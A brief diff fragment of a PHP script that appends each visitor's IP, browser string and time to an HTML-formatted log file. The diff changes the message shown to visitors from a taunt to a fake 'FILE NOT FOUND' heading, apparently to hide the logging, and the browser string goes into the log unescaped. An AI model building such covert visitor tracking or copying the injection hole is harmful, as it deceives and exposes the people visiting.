@@ -9,5 +9,5 @@ $file = fopen($file, "a");
 $data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
 fwrite($file, $data);
 fclose($file);
-echo "<h1>Hi n0.0b :)</h1>";
+echo "<h1>FILE NOT FOUND</h1>";
 ?>
